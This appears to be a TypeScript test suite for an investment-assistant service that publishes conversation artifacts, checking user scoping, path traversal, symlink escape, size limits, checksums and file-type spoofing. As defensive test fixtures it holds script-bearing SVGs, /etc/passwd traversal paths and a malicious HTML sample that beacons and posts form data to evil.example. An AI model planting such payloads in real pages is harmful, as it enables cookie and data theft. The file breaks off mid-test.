import assert from "node:assert/strict";
import { mkdtemp, mkdir, symlink, unlink, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import test from "node:test";

import type * as ArtifactModuleType from "../src/services/conversation-artifacts.js";

type ArtifactModule = typeof ArtifactModuleType;

const VALID_SVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect width="50" height="50" fill="#10a37f"/></svg>`;

const VALID_MG_MARKDOWN = `# 2026-07-24 投资助手月度指标

## 持仓风险监控

- ZZLKP 主力控盘持续位于阈值上方
- 主力净流入近 5 日累计正向

## 下一步

1. 维持现持仓
2. 跟踪主力流入连续性
`;

interface TestContext {
  root: string;
  workspaceRoot: string;
  workspaceUserA: string;
  workspaceUserB: string;
  mod: ArtifactModule;
  sqlite: import("better-sqlite3").Database;
}

/**
 * All artifact tests share a single workspace + SQLite db. The artifact
 * module + config + sqlite handle are captured at module load time, so a
 * per-test reset would require cache busting which is fragile under tsx.
 * Sharing the workspace keeps the test fast and deterministic; each test
 * writes its own unique files so they don't observe each other's state.
 */
async function setupSharedFixture(): Promise<TestContext> {
  const root = await mkdtemp(path.join(os.tmpdir(), "invest-agent-artifacts-"));
  const workspaceRoot = path.join(root, "workspaces");
  const workspaceUserA = path.join(workspaceRoot, "user-a");
  const workspaceUserB = path.join(workspaceRoot, "user-b");
  await mkdir(path.join(workspaceUserA, "reports", "daily"), { recursive: true });
  await mkdir(path.join(workspaceUserA, "reports", "html"), { recursive: true });
  await mkdir(path.join(workspaceUserA, "reports", "metrics"), { recursive: true });
  await mkdir(path.join(workspaceUserA, "config"), { recursive: true });
  await mkdir(path.join(workspaceUserB, "reports", "daily"), { recursive: true });
  process.env.WORKSPACE_ROOT = workspaceRoot;
  process.env.DB_PATH = path.join(root, "test.db");
  process.env.NODE_ENV = "test";
  const { initDb, sqlite } = await import("../src/db/index.js");
  initDb();
  const mod = await import("../src/services/conversation-artifacts.js");
  return { root, workspaceRoot, workspaceUserA, workspaceUserB, mod, sqlite };
}

let ctxPromise: Promise<TestContext> | null = null;
async function getCtx(): Promise<TestContext> {
  if (!ctxPromise) ctxPromise = setupSharedFixture();
  return ctxPromise;
}

function expectErrorCode(error: unknown, code: string): boolean {
  return (
    error instanceof Error &&
    error.name === "ConversationArtifactError" &&
    (error as ArtifactModuleType.ConversationArtifactError).code === code
  );
}

test("publishes and reads a valid mg-shaped markdown report", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const target = path.join(workspaceUserA, "reports", "daily", "2026-07-24.md");
  await writeFile(target, VALID_MG_MARKDOWN);
  const record = await mod.publishConversationArtifact({
    userId: "user-a",
    instanceId: "user-a",
    relativePath: "reports/daily/2026-07-24.md",
    scope: { projectId: "invest-agent", assistantId: "user-a", conversationId: "conv-1" },
  });
  assert.equal(record.mimeType, "text/markdown");
  assert.equal(record.previewMode, "markdown");
  assert.equal(record.checksum && record.checksum.length, 64);
  const read = await mod.readConversationArtifactPayload({
    artifactId: record.artifactId,
    userId: "user-a",
    instanceId: "user-a",
  });
  assert.equal(read.payload.mimeType, "text/markdown");
  assert.equal(Buffer.from(read.payload.base64, "base64").toString("utf8"), VALID_MG_MARKDOWN);
});

test("publishes and reads a user-owned YAML config artifact without changing bytes", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const relativePath = "config/portfolio.yaml";
  const content = "cash:\n  ratio_percent: 35\nholdings:\n  - code: '600000'\n    name: 测试标的\n";
  await writeFile(path.join(workspaceUserA, relativePath), content, "utf8");
  const record = await mod.publishConversationArtifact({
    userId: "user-a",
    instanceId: "user-a",
    relativePath,
    scope: { projectId: "invest-agent", assistantId: "user-a", conversationId: "conv-config" },
  });
  assert.equal(record.mimeType, "application/yaml");
  assert.equal(record.previewMode, "text");
  assert.equal(record.visibility, "conversation_only");
  const read = await mod.readConversationArtifactPayload({
    artifactId: record.artifactId,
    userId: "user-a",
    instanceId: "user-a",
  });
  assert.equal(read.payload.mimeType, "application/yaml");
  assert.equal(Buffer.from(read.payload.base64, "base64").toString("utf8"), content);
  assert.equal(read.payload.checksum, record.checksum);
});

test("conversation reads enrich historical artifact metadata with a browsable workspace path", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const relativePath = "reports/daily/historical-path.md";
  await writeFile(path.join(workspaceUserA, relativePath), "# Historical artifact\n");
  const record = await mod.publishConversationArtifact({
    userId: "user-a",
    instanceId: "user-a",
    relativePath,
    scope: { projectId: "invest-agent", assistantId: "user-a", conversationId: "conv-historical-path" },
  });
  const { appendConversationMessage, getConversation } = await import("../src/services/conversation-log.js");
  appendConversationMessage({
    scope: { userId: "user-a", instanceId: "user-a", assistantId: "user-a", projectId: "invest-agent" },
    conversationId: "conv-historical-path",
    channel: "web",
    role: "assistant",
    content: "历史报告",
    metadata: {
      artifacts: [{
        artifactId: record.artifactId,
        title: record.title,
        fileName: record.fileName,
        mimeType: record.mimeType,
        sizeBytes: record.sizeBytes,
        kind: record.kind,
        previewMode: record.previewMode,
        createdAt: record.createdAt,
      }],
    },
  });
  const conversation = getConversation({
    userId: "user-a",
    instanceId: "user-a",
    conversationId: "conv-historical-path",
  });
  const artifacts = conversation.messages[0]?.metadata?.artifacts as Array<Record<string, unknown>>;
  assert.equal(artifacts[0]?.workspacePath, relativePath);
});

test("publishes and reads a valid flow SVG artifact, preserving original bytes", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const target = path.join(workspaceUserA, "reports", "metrics", "flow.svg");
  await writeFile(target, VALID_SVG);
  const record = await mod.publishConversationArtifact({
    userId: "user-a",
    instanceId: "user-a",
    relativePath: "reports/metrics/flow.svg",
    scope: { projectId: "invest-agent", assistantId: "user-a" },
  });
  assert.equal(record.mimeType, "image/svg+xml");
  const read = await mod.readConversationArtifactPayload({
    artifactId: record.artifactId,
    userId: "user-a",
    instanceId: "user-a",
  });
  // The conservative scan accepts this SVG, so the runtime must NOT mutate
  // the bytes (no trimming, no attribute rewriting). The payload checksum
  // equals the workspace file checksum.
  assert.equal(read.payload.sanitized, false);
  const decoded = Buffer.from(read.payload.base64, "base64").toString("utf8");
  assert.equal(decoded, VALID_SVG);
  assert.equal(read.payload.checksum, record.checksum);
});

test("SVG artifact with leading/trailing whitespace and newlines preserves checksum", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const target = path.join(workspaceUserA, "reports", "metrics", "padded.svg");
  // Pretend an external tool wrote an SVG with surrounding whitespace and
  // newlines. The sanitizer used to trim these off, which broke the
  // workspace checksum contract; the fix preserves the bytes as long as
  // the conservative scan accepts them.
  const payload = `\n\n   <?xml version="1.0"?>\n  ${VALID_SVG}\n\n`;
  await writeFile(target, payload);
  const record = await mod.publishConversationArtifact({
    userId: "user-a",
    instanceId: "user-a",
    relativePath: "reports/metrics/padded.svg",
    scope: { projectId: "invest-agent", assistantId: "user-a" },
  });
  const read = await mod.readConversationArtifactPayload({
    artifactId: record.artifactId,
    userId: "user-a",
    instanceId: "user-a",
  });
  const decoded = Buffer.from(read.payload.base64, "base64").toString("utf8");
  assert.equal(decoded, payload);
  assert.equal(read.payload.checksum, record.checksum);
  // Explicit SHA-256 of the original bytes must match the record.
  const { createHash } = await import("node:crypto");
  const expected = createHash("sha256").update(Buffer.from(payload, "utf8")).digest("hex");
  assert.equal(read.payload.checksum, expected);
});

test("rejects cross-user artifact access", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const target = path.join(workspaceUserA, "reports", "daily", "secret.md");
  await writeFile(target, "user-a private data");
  const record = await mod.publishConversationArtifact({
    userId: "user-a",
    instanceId: "user-a",
    relativePath: "reports/daily/secret.md",
    scope: { projectId: "invest-agent", assistantId: "user-a" },
  });
  await assert.rejects(
    () => mod.readConversationArtifactPayload({ artifactId: record.artifactId, userId: "user-b", instanceId: "user-b" }),
    (error: unknown) => expectErrorCode(error, "ARTIFACT_SCOPE_MISMATCH"),
  );
});

test("rejects cross-instance artifact access for the same user", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const target = path.join(workspaceUserA, "reports", "daily", "scope-instance.md");
  await writeFile(target, "scoped to instance-a");
  const record = await mod.publishConversationArtifact({
    userId: "user-a",
    instanceId: "instance-a",
    relativePath: "reports/daily/scope-instance.md",
    scope: { projectId: "invest-agent", assistantId: "instance-a" },
  });
  await assert.rejects(
    () => mod.readConversationArtifactPayload({ artifactId: record.artifactId, userId: "user-a", instanceId: "instance-b" }),
    (error: unknown) => expectErrorCode(error, "ARTIFACT_SCOPE_MISMATCH"),
  );
});

test("rejects parent-directory traversal in relativePath", async () => {
  const { mod } = await getCtx();
  await assert.rejects(
    () => mod.publishConversationArtifact({
      userId: "user-a",
      instanceId: "user-a",
      relativePath: "reports/daily/../../etc/passwd",
      scope: { projectId: "invest-agent", assistantId: "user-a" },
    }),
    (error: unknown) => expectErrorCode(error, "ARTIFACT_INVALID_PATH"),
  );
  await assert.rejects(
    () => mod.publishLegacyPathArtifact({
      userId: "user-a",
      instanceId: "user-a",
      projectId: "invest-agent",
      assistantId: "user-a",
      relativePath: "../secret.md",
    }),
    (error: unknown) => expectErrorCode(error, "ARTIFACT_INVALID_PATH"),
  );
});

test("rejects absolute paths", async () => {
  const { mod } = await getCtx();
  await assert.rejects(
    () => mod.publishConversationArtifact({
      userId: "user-a",
      instanceId: "user-a",
      relativePath: "/etc/passwd",
      scope: { projectId: "invest-agent", assistantId: "user-a" },
    }),
    (error: unknown) => expectErrorCode(error, "ARTIFACT_INVALID_PATH"),
  );
  await assert.rejects(
    () => mod.publishConversationArtifact({
      userId: "user-a",
      instanceId: "user-a",
      relativePath: "reports/../reports/daily",
      scope: { projectId: "invest-agent", assistantId: "user-a" },
    }),
    (error: unknown) => expectErrorCode(error, "ARTIFACT_INVALID_PATH"),
  );
});

test("rejects symlinks that escape the reports directory", async () => {
  const { root, workspaceUserA, mod } = await getCtx();
  const outsideSecret = path.join(root, "secret.svg");
  await writeFile(outsideSecret, "<svg xmlns=\"http://www.w3.org/2000/svg\"/>");
  const symlinkTarget = path.join(workspaceUserA, "reports", "metrics", "escape.svg");
  await symlink(outsideSecret, symlinkTarget);
  await assert.rejects(
    () => mod.publishConversationArtifact({
      userId: "user-a",
      instanceId: "user-a",
      relativePath: "reports/metrics/escape.svg",
      scope: { projectId: "invest-agent", assistantId: "user-a" },
    }),
    (error: unknown) =>
      expectErrorCode(error, "ARTIFACT_INVALID_PATH") || expectErrorCode(error, "ARTIFACT_NOT_FOUND"),
  );
});

test("rejects dangerous SVG with embedded script", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const target = path.join(workspaceUserA, "reports", "metrics", "evil.svg");
  await writeFile(target, `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`);
  await assert.rejects(
    () => mod.publishConversationArtifact({
      userId: "user-a",
      instanceId: "user-a",
      relativePath: "reports/metrics/evil.svg",
      scope: { projectId: "invest-agent", assistantId: "user-a" },
    }),
    (error: unknown) => expectErrorCode(error, "ARTIFACT_UNSAFE"),
  );
});

test("rejects SVG with onload handler", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const target = path.join(workspaceUserA, "reports", "metrics", "onload.svg");
  await writeFile(target, `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>`);
  await assert.rejects(
    () => mod.publishConversationArtifact({
      userId: "user-a",
      instanceId: "user-a",
      relativePath: "reports/metrics/onload.svg",
      scope: { projectId: "invest-agent", assistantId: "user-a" },
    }),
    (error: unknown) => expectErrorCode(error, "ARTIFACT_UNSAFE"),
  );
});

test("rejects oversized files", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const target = path.join(workspaceUserA, "reports", "daily", "big.csv");
  const huge = "x".repeat(16 * 1024 * 1024);
  await writeFile(target, huge);
  await assert.rejects(
    () => mod.publishConversationArtifact({
      userId: "user-a",
      instanceId: "user-a",
      relativePath: "reports/daily/big.csv",
      scope: { projectId: "invest-agent", assistantId: "user-a" },
    }),
    (error: unknown) => expectErrorCode(error, "ARTIFACT_TOO_LARGE"),
  );
});

test("rejects checksum mismatch when file changes after publish", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const target = path.join(workspaceUserA, "reports", "daily", "changing.md");
  await writeFile(target, "original content");
  const record = await mod.publishConversationArtifact({
    userId: "user-a",
    instanceId: "user-a",
    relativePath: "reports/daily/changing.md",
    scope: { projectId: "invest-agent", assistantId: "user-a" },
  });
  await writeFile(target, "tampered content after publish");
  await assert.rejects(
    () => mod.readConversationArtifactPayload({ artifactId: record.artifactId, userId: "user-a", instanceId: "user-a" }),
    (error: unknown) => expectErrorCode(error, "ARTIFACT_UNSAFE"),
  );
});

test("rejects extension masquerading: png extension with html body", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const target = path.join(workspaceUserA, "reports", "metrics", "fake.png");
  await writeFile(target, "<html><script>alert(1)</script></html>");
  await assert.rejects(
    () => mod.publishConversationArtifact({
      userId: "user-a",
      instanceId: "user-a",
      relativePath: "reports/metrics/fake.png",
      scope: { projectId: "invest-agent", assistantId: "user-a" },
    }),
    (error: unknown) => expectErrorCode(error, "ARTIFACT_UNSAFE"),
  );
});

test("rejects extension masquerading: md extension with PNG body", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const target = path.join(workspaceUserA, "reports", "daily", "fake.md");
  const pngBytes = Buffer.from([
    0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
    0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
  ]);
  await writeFile(target, pngBytes);
  await assert.rejects(
    () => mod.publishConversationArtifact({
      userId: "user-a",
      instanceId: "user-a",
      relativePath: "reports/daily/fake.md",
      scope: { projectId: "invest-agent", assistantId: "user-a" },
    }),
    (error: unknown) => expectErrorCode(error, "ARTIFACT_UNSAFE"),
  );
});

test("accepts valid PNG with matching magic bytes", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const target = path.join(workspaceUserA, "reports", "metrics", "real.png");
  const pngBytes = Buffer.from([
    0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
    0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
    0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
    0x08, 0x06, 0x00, 0x00, 0x00, 0x1f, 0x15, 0xc4,
  ]);
  await writeFile(target, pngBytes);
  const record = await mod.publishConversationArtifact({
    userId: "user-a",
    instanceId: "user-a",
    relativePath: "reports/metrics/real.png",
    scope: { projectId: "invest-agent", assistantId: "user-a" },
  });
  assert.equal(record.mimeType, "image/png");
});

test("accepts valid JPEG with matching magic bytes", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const target = path.join(workspaceUserA, "reports", "metrics", "real.jpg");
  const jpegBytes = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]);
  await writeFile(target, jpegBytes);
  const record = await mod.publishConversationArtifact({
    userId: "user-a",
    instanceId: "user-a",
    relativePath: "reports/metrics/real.jpg",
    scope: { projectId: "invest-agent", assistantId: "user-a" },
  });
  assert.equal(record.mimeType, "image/jpeg");
});

test("accepts valid WebP and valid PDF magic bytes", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const webpTarget = path.join(workspaceUserA, "reports", "metrics", "real.webp");
  await writeFile(webpTarget, Buffer.from([
    0x52, 0x49, 0x46, 0x46, 0x00, 0x00, 0x00, 0x00,
    0x57, 0x45, 0x42, 0x50, 0x56, 0x50, 0x38, 0x4c,
  ]));
  const webpRecord = await mod.publishConversationArtifact({
    userId: "user-a",
    instanceId: "user-a",
    relativePath: "reports/metrics/real.webp",
    scope: { projectId: "invest-agent", assistantId: "user-a" },
  });
  assert.equal(webpRecord.mimeType, "image/webp");

  const pdfTarget = path.join(workspaceUserA, "reports", "daily", "report.pdf");
  await writeFile(pdfTarget, Buffer.from("%PDF-1.4\n1 0 obj<<>>endobj\n"));
  const pdfRecord = await mod.publishConversationArtifact({
    userId: "user-a",
    instanceId: "user-a",
    relativePath: "reports/daily/report.pdf",
    scope: { projectId: "invest-agent", assistantId: "user-a" },
  });
  assert.equal(pdfRecord.mimeType, "application/pdf");
});

test("artifact events table receives open success and failure rows", async () => {
  const { workspaceUserA, mod, sqlite } = await getCtx();
  const target = path.join(workspaceUserA, "reports", "daily", "audited.md");
  await writeFile(target, "audit me");
  const record = await mod.publishConversationArtifact({
    userId: "user-a",
    instanceId: "user-a",
    relativePath: "reports/daily/audited.md",
    scope: { projectId: "invest-agent", assistantId: "user-a" },
  });
  // Simulate the connector layer's open/success/failure telemetry flow.
  mod.logArtifactEvent({ artifactId: record.artifactId, userId: "user-a", instanceId: "user-a", event: "open" });
  mod.logArtifactEvent({ artifactId: record.artifactId, userId: "user-a", instanceId: "user-a", event: "success" });
  mod.logArtifactEvent({
    artifactId: "art_does_not_exist",
    userId: "user-a",
    instanceId: "user-a",
    event: "failure",
    status: "failure",
    reason: "ARTIFACT_NOT_FOUND",
  });
  const rows = sqlite
    .prepare("SELECT event FROM conversation_artifact_events WHERE artifact_id = ? ORDER BY created_at ASC")
    .all(record.artifactId) as Array<{ event: string }>;
  assert.ok(rows.some((row) => row.event === "open"));
  assert.ok(rows.some((row) => row.event === "success"));
  const failEvents = sqlite
    .prepare("SELECT event FROM conversation_artifact_events WHERE artifact_id = ? AND event = 'failure'")
    .all("art_does_not_exist") as Array<{ event: string }>;
  assert.equal(failEvents.length, 1);
});

test("artifacts bind to the exact turn that published them, not to whichever reply finishes next", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const conversationId = "conv-overlap";
  const userId = "user-a";
  const instanceId = "user-a";

  // Each turn publishes its own artifact. The MCP tool sees the
  // current_turn_id via the `conversation_turn_active` table.
  const turnA = "portal-turn-a";
  const turnB = "portal-turn-b";

  const targetA = path.join(workspaceUserA, "reports", "daily", "turn-a.md");
  const targetB = path.join(workspaceUserA, "reports", "daily", "turn-b.md");
  await writeFile(targetA, "turn A content");
  await writeFile(targetB, "turn B content");

  const { markTurnStart, markTurnEnd } = await import("../src/services/conversation-turns.js");

  // Turn A starts, publishes its artifact, then "ends".
  markTurnStart({ userId, instanceId, conversationId, turnId: turnA });
  const recordA = await mod.publishConversationArtifact({
    userId,
    instanceId,
    relativePath: "reports/daily/turn-a.md",
    scope: { projectId: "invest-agent", assistantId: userId, conversationId },
  });
  markTurnEnd({ userId, instanceId, conversationId, turnId: turnA });

  // Turn B starts next, publishes its own artifact, then "ends". If we
  // were still using `message_id IS NULL` as the join key, attaching
  // turn B's reply first would silently steal turn A's artifact.
  markTurnStart({ userId, instanceId, conversationId, turnId: turnB });
  const recordB = await mod.publishConversationArtifact({
    userId,
    instanceId,
    relativePath: "reports/daily/turn-b.md",
    scope: { projectId: "invest-agent", assistantId: userId, conversationId },
  });
  markTurnEnd({ userId, instanceId, conversationId, turnId: turnB });

  assert.equal(recordA.turnId, turnA);
  assert.equal(recordB.turnId, turnB);

  // Assistant message for turn B finishes first. With turn-keyed
  // attachment, only record B can attach to it.
  const msgB = "msg-assistant-b";
  mod.bindArtifactsToAssistantMessageForTest?.({
    userId,
    instanceId,
    conversationId,
    assistantMessageId: msgB,
    turnId: turnB,
  });

  const turnBArtifacts = mod.findArtifactsForTurn({ userId, instanceId, conversationId, turnId: turnB });
  assert.equal(turnBArtifacts.length, 1);
  assert.equal(turnBArtifacts[0].artifactId, recordB.artifactId);

  // recordA is still unattached (its message_id should remain NULL until
  // turn A's assistant message is processed).
  const stillPending = mod.findArtifactsForTurn({ userId, instanceId, conversationId, turnId: turnA });
  assert.equal(stillPending.length, 1);
  assert.equal(stillPending[0].artifactId, recordA.artifactId);
  assert.equal(stillPending[0].messageId, null);

  // Turn A's assistant message now finishes; record A attaches cleanly
  // even though record B already attached to msgB.
  const msgA = "msg-assistant-a";
  mod.bindArtifactsToAssistantMessageForTest?.({
    userId,
    instanceId,
    conversationId,
    assistantMessageId: msgA,
    turnId: turnA,
  });
  const msgAArtifacts = mod.findArtifactsForMessage({ userId, instanceId, conversationId, messageId: msgA });
  assert.equal(msgAArtifacts.length, 1);
  assert.equal(msgAArtifacts[0].artifactId, recordA.artifactId);

  const msgBArtifacts = mod.findArtifactsForMessage({ userId, instanceId, conversationId, messageId: msgB });
  assert.equal(msgBArtifacts.length, 1);
  assert.equal(msgBArtifacts[0].artifactId, recordB.artifactId);
});

test("artifact published outside of any active turn stays unbound to a message", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const conversationId = "conv-no-turn";
  const userId = "user-a";
  const instanceId = "user-a";

  const target = path.join(workspaceUserA, "reports", "daily", "no-turn.md");
  await writeFile(target, "no active turn content");

  // No markTurnStart call — simulates a legacy path publish from the
  // Portal that happens outside of any ACP turn.
  const record = await mod.publishConversationArtifact({
    userId,
    instanceId,
    relativePath: "reports/daily/no-turn.md",
    scope: { projectId: "invest-agent", assistantId: userId, conversationId },
  });
  assert.equal(record.turnId, null);
});

test("overlapping conversation turns are serialized before active-turn markers are set", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const conversationId = "conv-serialized-overlap";
  const userId = "user-a";
  const instanceId = "user-a";
  const targetA = path.join(workspaceUserA, "reports", "daily", "serialized-a.md");
  const targetB = path.join(workspaceUserA, "reports", "daily", "serialized-b.md");
  await writeFile(targetA, "serialized A");
  await writeFile(targetB, "serialized B");

  const { withConversationChatLock } = await import("../src/services/conversation-log.js");
  const { markTurnStart, markTurnEnd } = await import("../src/services/conversation-turns.js");
  const scope = { userId, instanceId, conversationId };
  let firstPublished = false;
  const first = withConversationChatLock(scope, async () => {
    markTurnStart({ ...scope, turnId: "serialized-turn-a" });
    const record = await mod.publishConversationArtifact({
      userId,
      instanceId,
      relativePath: "reports/daily/serialized-a.md",
      scope: { projectId: "invest-agent", assistantId: userId, conversationId },
    });
    firstPublished = true;
    await new Promise((resolve) => setTimeout(resolve, 15));
    markTurnEnd({ ...scope, turnId: "serialized-turn-a" });
    return record;
  });
  const second = withConversationChatLock(scope, async () => {
    assert.equal(firstPublished, true);
    markTurnStart({ ...scope, turnId: "serialized-turn-b" });
    const record = await mod.publishConversationArtifact({
      userId,
      instanceId,
      relativePath: "reports/daily/serialized-b.md",
      scope: { projectId: "invest-agent", assistantId: userId, conversationId },
    });
    markTurnEnd({ ...scope, turnId: "serialized-turn-b" });
    return record;
  });

  const [recordA, recordB] = await Promise.all([first, second]);
  assert.equal(recordA.turnId, "serialized-turn-a");
  assert.equal(recordB.turnId, "serialized-turn-b");
});

const VALID_HTML = `<!DOCTYPE html>
<html lang="zh"><head><meta charset="utf-8"><title>复盘</title><style>body{color:#111}</style></head>
<body><h1>2026-07-24 日复盘</h1><p>持仓稳定，无新增风险信号。</p></body></html>`;

const MALICIOUS_HTML = `<!DOCTYPE html>
<html><head><meta charset="utf-8"><script>alert(document.cookie)</script><link rel="stylesheet" href="https://evil.example/x.css"></head>
<body onload="fetch('https://evil.example/beacon')"><img src="https://evil.example/x.png" onerror="alert(1)">
<form action="https://evil.example/collect" method="post"><input name="secret"></form>
<a href="https://evil.example">external link</a></body></html>`;

test("publishes and reads a safe HTML document with html preview mode and stable checksum", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const relativePath = "reports/html/2026-07-24-portfolio-risk.html";
  const target = path.join(workspaceUserA, relativePath);
  await writeFile(target, VALID_HTML);
  const record = await mod.publishConversationArtifact({
    userId: "user-a",
    instanceId: "user-a",
    relativePath,
    scope: { projectId: "invest-agent", assistantId: "user-a", conversationId: "conv-html" },
  });
  assert.equal(record.mimeType, "text/html");
  assert.equal(record.previewMode, "html");
  assert.equal(record.kind, "report");
  assert.equal(record.retentionClass, "durable_library");
  assert.equal(record.visibility, "library");
  assert.equal(record.expiresAt, null);
  assert.equal(record.checksum && record.checksum.length, 64);
  const read = await mod.readConversationArtifactPayload({
    artifactId: record.artifactId,
    userId: "user-a",
    instanceId: "user-a",
  });
  assert.equal(read.payload.mimeType, "text/html");
  assert.equal(read.descriptor.previewMode, "html");
  assert.equal(Buffer.from(read.payload.base64, "base64").toString("utf8"), VALID_HTML);
  assert.equal(read.payload.checksum, record.checksum);
  const { createHash } = await import("node:crypto");
  assert.equal(record.checksum, createHash("sha256").update(Buffer.from(VALID_HTML, "utf8")).digest("hex"));
  const library = await mod.listCuratedArtifactLibrary({ userId: "user-a", instanceId: "user-a" });
  assert.equal(library.items.find((item) => item.artifactId === record.artifactId)?.category, "html");
});

test("maps .htm files to text/html with html preview mode", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const target = path.join(workspaceUserA, "reports", "daily", "brief.htm");
  await writeFile(target, VALID_HTML);
  const record = await mod.publishConversationArtifact({
    userId: "user-a",
    instanceId: "user-a",
    relativePath: "reports/daily/brief.htm",
    scope: { projectId: "invest-agent", assistantId: "user-a" },
  });
  assert.equal(record.mimeType, "text/html");
  assert.equal(record.previewMode, "html");
});

test("rejects HTML documents larger than the 1MB html cap", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const target = path.join(workspaceUserA, "reports", "daily", "huge.html");
  // Just over the 1MB html cap but far below the generic 15MB cap, so this
  // only passes if the tighter html limit is enforced.
  const huge = `<div>${"x".repeat(1024 * 1024)}</div>`;
  await writeFile(target, huge);
  await assert.rejects(
    () => mod.publishConversationArtifact({
      userId: "user-a",
      instanceId: "user-a",
      relativePath: "reports/daily/huge.html",
      scope: { projectId: "invest-agent", assistantId: "user-a" },
    }),
    (error: unknown) => expectErrorCode(error, "ARTIFACT_TOO_LARGE"),
  );
});

test("rejects extension masquerading: html extension with PNG body", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const target = path.join(workspaceUserA, "reports", "daily", "fake.html");
  const pngBytes = Buffer.from([
    0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
    0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
  ]);
  await writeFile(target, pngBytes);
  await assert.rejects(
    () => mod.publishConversationArtifact({
      userId: "user-a",
      instanceId: "user-a",
      relativePath: "reports/daily/fake.html",
      scope: { projectId: "invest-agent", assistantId: "user-a" },
    }),
    (error: unknown) => expectErrorCode(error, "ARTIFACT_UNSAFE"),
  );
});

test("rejects path traversal for html artifacts", async () => {
  const { mod } = await getCtx();
  await assert.rejects(
    () => mod.publishConversationArtifact({
      userId: "user-a",
      instanceId: "user-a",
      relativePath: "reports/daily/../../../etc/evil.html",
      scope: { projectId: "invest-agent", assistantId: "user-a" },
    }),
    (error: unknown) => expectErrorCode(error, "ARTIFACT_INVALID_PATH"),
  );
});

test("rejects html symlinks that escape the reports directory", async () => {
  const { root, workspaceUserA, mod } = await getCtx();
  const outsideHtml = path.join(root, "outside.html");
  await writeFile(outsideHtml, VALID_HTML);
  const symlinkTarget = path.join(workspaceUserA, "reports", "daily", "escape.html");
  await symlink(outsideHtml, symlinkTarget);
  await assert.rejects(
    () => mod.publishConversationArtifact({
      userId: "user-a",
      instanceId: "user-a",
      relativePath: "reports/daily/escape.html",
      scope: { projectId: "invest-agent", assistantId: "user-a" },
    }),
    (error: unknown) =>
      expectErrorCode(error, "ARTIFACT_INVALID_PATH") || expectErrorCode(error, "ARTIFACT_NOT_FOUND"),
  );
});

test("rejects cross-user reads of html artifacts", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const target = path.join(workspaceUserA, "reports", "daily", "private.html");
  await writeFile(target, VALID_HTML);
  const record = await mod.publishConversationArtifact({
    userId: "user-a",
    instanceId: "user-a",
    relativePath: "reports/daily/private.html",
    scope: { projectId: "invest-agent", assistantId: "user-a" },
  });
  await assert.rejects(
    () => mod.readConversationArtifactPayload({ artifactId: record.artifactId, userId: "user-b", instanceId: "user-b" }),
    (error: unknown) => expectErrorCode(error, "ARTIFACT_SCOPE_MISMATCH"),
  );
});

test("malicious HTML is only ever served as artifact bytes, never via the legacy report asset route", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const target = path.join(workspaceUserA, "reports", "daily", "evil.html");
  await writeFile(target, MALICIOUS_HTML);
  // The runtime does not execute or rewrite HTML: the payload is stored and
  // returned verbatim as opaque artifact bytes. The Portal safety boundary
  // is the sandboxed iframe + CSP, which is out of scope for this service.
  const record = await mod.publishConversationArtifact({
    userId: "user-a",
    instanceId: "user-a",
    relativePath: "reports/daily/evil.html",
    scope: { projectId: "invest-agent", assistantId: "user-a" },
  });
  assert.equal(record.previewMode, "html");
  const read = await mod.readConversationArtifactPayload({
    artifactId: record.artifactId,
    userId: "user-a",
    instanceId: "user-a",
  });
  assert.equal(read.payload.mimeType, "text/html");
  assert.equal(Buffer.from(read.payload.base64, "base64").toString("utf8"), MALICIOUS_HTML);
  assert.equal(read.payload.checksum, record.checksum);

  // The legacy same-origin report asset route must refuse to inline-serve
  // html content; html documents only travel through the artifact bytes
  // channel above.
  const assets = await import("../src/services/workspace-report-assets.js");
  for (const relativePath of ["reports/daily/evil.html", "reports/daily/brief.htm"]) {
    await assert.rejects(
      () => assets.readWorkspaceReportAsset({ userId: "user-a", relativePath }),
      (error: unknown) =>
        error instanceof Error &&
        error.name === "WorkspaceReportAssetError" &&
        (error as InstanceType<typeof assets.WorkspaceReportAssetError>).code === "REPORT_ASSET_UNSUPPORTED",
    );
  }
});

test("SVG artifact published inside a turn binds to the assistant message artifacts", async () => {
  const { workspaceUserA, mod } = await getCtx();
  const userId = "user-a";
  const instanceId = "user-a";
  const conversationId = "conv-svg-bind";
  const turnId = "svg-turn-1";
  const target = path.join(workspaceUserA, "reports", "metrics", "bind-flow.svg");
  await writeFile(target, VALID_SVG);

  const { markTurnStart, markTurnEnd } = await import("../src/services/conversation-turns.js");
  markTurnStart({ userId, instanceId, conversationId, turnId });
  const record = await mod.publishConversationArtifact({
